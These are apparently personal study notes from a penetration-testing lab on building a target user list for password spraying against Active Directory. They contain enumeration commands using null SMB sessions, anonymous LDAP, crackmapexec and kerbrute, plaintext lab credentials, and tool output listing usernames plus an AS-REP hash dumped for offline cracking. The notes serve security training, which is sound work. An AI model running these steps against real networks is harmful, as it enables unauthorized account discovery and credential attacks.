# Password Spraying - Making a Target User List

Several ways to gather a target list of valid users :

- SMB NULL session -> complete list of domain users
- Utilizing an LDAP anonymous bind to query LDAP anonymously
- Kerbrute
- LLMNR/NBT-NS response poisoning using Responder

-> consider the domain password policy to formulate the list of passwords

**keep a log of our activities** : (including)
- The accounts targeted
- Domain Controller used in the attack
- Time of the spray
- Date of the spray
- Password(s) attempted

## SMB NULL Session (enum4linux or rpcclient)

enum4linux -U $TARGET | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

rpcclient -U "" -N $TARGET
rpcclient $> enumdomusers 

## CrackMapExec

crackmapexec smb $TARGET --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228

## LDAP Anonymous

ldapsearch -h $TARGET -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"

./windapsearch.py --dc-ip $TARGET -u "" -U

## Kerbrute

This tool uses Kerberos Pre-Authentication

stealthier : not generate Windows event ID 4625

kerbrute userenum -d inlanefreight.local --dc $TARGET /opt/jsmith.txt

## Build a list with valid credentials

sudo crackmapexec smb $TARGET -u htb-student -p Academy_student_AD! --users

## LAB

ssh htb-student@$TARGET
HTB_@cademy_stdnt!
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

2023/11/29 16:10:46 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2023/11/29 16:10:46 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d57adfdc6a68fd5e9b2f942bb1f26229$2fb3354ad7ea04d498c185fccad891a343e457a981b8d5ed566c41e69e05dd1a26c71a3400f3a3d08248aead399fb5b524a2a59089969d4ed3cc5ad87773a36ec505310ae66c142bb0a48ef6c0b217da598cf2e09f1a67ca7e0a941ba61ed128481ce5cc3758127e1beacf5348d8fb41cf2cd31f71bca2d931c199d1f1d1ac4943249353c78dd3ace6f2ab4583621b9389e8d7672340b52b608cef97b81171313f875c6a0620f2881da2b05d91536d3cd74bfa2c81d3bbb2b767a26396b649640b4a49dee52e2708e21c09001606cc0cb952cfdd86b9fb0d5112a2fb1f2e4a3f4f4a9ddef05ded46fb829096da0cd5d43c07f54ad06b9a1ae856b91e3441536fdf237dd335ac146f0ff9
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 mmorgan@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 rramirez@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 jwallace@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 jsantiago@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 gdavis@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 mrichardson@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 mharrison@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 tgarcia@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 jmay@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 jmontgomery@inlanefreight.local
2023/11/29 16:10:46 >  [+] VALID USERNAME:	 jhopkins@inlanefreight.local
2023/11/29 16:10:47 >  [+] VALID USERNAME:	 dpayne@inlanefreight.local
2023/11/29 16:10:47 >  [+] VALID USERNAME:	 mhicks@inlanefreight.local
2023/11/29 16:10:47 >  [+] VALID USERNAME:	 adunn@inlanefreight.local
2023/11/29 16:10:47 >  [+] VALID USERNAME:	 lmatthews@inlanefreight.local
2023/11/29 16:10:47 >  [+] VALID USERNAME:	 avazquez@inlanefreight.local
2023/11/29 16:10:47 >  [+] VALID USERNAME:	 mlowe@inlanefreight.local
2023/11/29 16:10:47 >  [+] VALID USERNAME:	 jmcdaniel@inlanefreight.local
2023/11/29 16:10:47 >  [+] VALID USERNAME:	 csteele@inlanefreight.local
2023/11/29 16:10:47 >  [+] VALID USERNAME:	 mmullins@inlanefreight.local
2023/11/29 16:10:47 >  [+] VALID USERNAME:	 mochoa@inlanefreight.local
2023/11/29 16:10:48 >  [+] VALID USERNAME:	 aslater@inlanefreight.local
2023/11/29 16:10:48 >  [+] VALID USERNAME:	 ehoffman@inlanefreight.local
2023/11/29 16:10:48 >  [+] VALID USERNAME:	 ehamilton@inlanefreight.local
2023/11/29 16:10:48 >  [+] VALID USERNAME:	 cpennington@inlanefreight.local
2023/11/29 16:10:48 >  [+] VALID USERNAME:	 srosario@inlanefreight.local
2023/11/29 16:10:48 >  [+] VALID USERNAME:	 lbradford@inlanefreight.local
2023/11/29 16:10:49 >  [+] VALID USERNAME:	 halvarez@inlanefreight.local
2023/11/29 16:10:49 >  [+] VALID USERNAME:	 gmccarthy@inlanefreight.local
2023/11/29 16:10:49 >  [+] VALID USERNAME:	 dbranch@inlanefreight.local
2023/11/29 16:10:49 >  [+] VALID USERNAME:	 mshoemaker@inlanefreight.local
2023/11/29 16:10:50 >  [+] VALID USERNAME:	 mholliday@inlanefreight.local
2023/11/29 16:10:50 >  [+] VALID USERNAME:	 ngriffith@inlanefreight.local
2023/11/29 16:10:50 >  [+] VALID USERNAME:	 sinman@inlanefreight.local
2023/11/29 16:10:50 >  [+] VALID USERNAME:	 minman@inlanefreight.local
2023/11/29 16:10:50 >  [+] VALID USERNAME:	 rhester@inlanefreight.local
2023/11/29 16:10:50 >  [+] VALID USERNAME:	 rburrows@inlanefreight.local
2023/11/29 16:10:50 >  [+] VALID USERNAME:	 dpalacios@inlanefreight.local
2023/11/29 16:10:51 >  [+] VALID USERNAME:	 strent@inlanefreight.local
2023/11/29 16:10:51 >  [+] VALID USERNAME:	 fanthony@inlanefreight.local
2023/11/29 16:10:51 >  [+] VALID USERNAME:	 evalentin@inlanefreight.local
2023/11/29 16:10:52 >  [+] VALID USERNAME:	 sgage@inlanefreight.local
2023/11/29 16:10:52 >  [+] VALID USERNAME:	 jshay@inlanefreight.local
2023/11/29 16:10:53 >  [+] VALID USERNAME:	 jhermann@inlanefreight.local
2023/11/29 16:10:53 >  [+] VALID USERNAME:	 whouse@inlanefreight.local
2023/11/29 16:10:54 >  [+] VALID USERNAME:	 emercer@inlanefreight.local
2023/11/29 16:10:55 >  [+] VALID USERNAME:	 wshepherd@inlanefreight.local
